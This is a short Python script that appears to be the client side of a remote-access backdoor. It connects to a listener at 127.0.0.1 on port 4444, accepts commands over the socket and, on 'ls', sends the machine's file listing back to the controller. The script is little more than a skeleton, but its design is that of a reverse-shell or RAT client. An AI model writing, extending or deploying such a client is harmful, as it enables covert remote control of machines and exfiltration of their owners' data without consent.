import socket as s
from commands import commands

host = '127.0.0.1'  
port = 4444

sock = s.socket(s.AF_INET, s.SOCK_STREAM)
sock.connect((host, port))

while True:
    try:
        cmd = sock.recv(1024).decode().strip()
        if not cmd:
            continue

        if cmd == 'ls':
            for files in commands.list_files():
                sock.send(str(files).encode())

    except Exception as e:
        print(f"Client Error: {e}")
        sock.close()
        break
